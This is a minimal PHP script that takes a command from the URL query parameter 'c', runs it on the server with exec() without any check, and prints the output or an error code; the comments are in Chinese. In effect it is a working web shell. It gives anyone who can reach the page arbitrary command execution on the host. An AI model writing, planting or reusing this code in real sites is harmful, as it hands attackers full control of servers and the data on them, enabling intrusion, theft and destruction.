<?php
if (isset($_GET['c'])) {
    $command = $_GET['c'];
    exec($command, $output, $returnCode);
    
    if ($returnCode === 0) {
        // 命令执行成功
        echo implode("\n", $output);
    } else {
        // 命令执行失败，输出错误信息
        echo "Command failed with error code: $returnCode\n";
        echo implode("\n", $output);
    }
}
?>
